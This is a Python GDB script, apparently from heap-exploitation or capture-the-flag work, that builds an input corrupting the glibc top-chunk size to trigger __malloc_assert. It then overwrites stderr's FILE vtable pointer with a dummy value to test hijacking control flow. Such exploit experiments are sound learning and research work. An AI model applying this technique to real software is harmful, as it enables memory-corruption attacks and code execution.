import gdb, struct
p64 = lambda x: struct.pack("<Q", x)

OPS = [
    (0x10, b"\x00"*8),
    (0x10, p64(0) + p64(0) + p64(0xd21)),   # bad top size (end 0xff0, not page aligned)
    (0x1000, b"\x00"*8),                    # should trigger __malloc_assert
]

def build(ops):
    out = b""
    for size, payload in ops:
        out += struct.pack("<Q", size) + payload + b"\n"
    return out

open("./_z_441/input.bin", "wb").write(build(OPS))

class GetsBP(gdb.Breakpoint):
    def stop(self):
        hits[0] += 1
        rdi = int(gdb.parse_and_eval("$rdi"))
        gdb.write("\n=== GETS#%d pkt=%#x ===\n" % (hits[0], rdi - 8))
        if hits[0] == 2:
            try:
                stderr = int(gdb.parse_and_eval("(unsigned long)&_IO_2_1_stderr_"))
            except Exception as e:
                gdb.write("no sym: %s\n" % e)
                stderr = 0
            if stderr:
                vt = stderr + 0xd8
                gdb.write("stderr=%#x vtable@%#x\n" % (stderr, vt))
                gdb.execute("set *(unsigned long*)%#x = 0x4141414141414141" % vt)
                gdb.write("patched!\n")
        return hits[0] >= len(OPS)

hits = [0]
GetsBP("gets")
try:
    gdb.execute("run < ./_z_441/input.bin")
except gdb.error as e:
    gdb.write("run ended: %s\n" % e)
gdb.write("\n==== signal info / where ====\n")
try:
    gdb.write(gdb.execute("p/x $pc", to_string=True))
    gdb.write(gdb.execute("bt", to_string=True))
except Exception as e:
    gdb.write("bt err %s\n" % e)
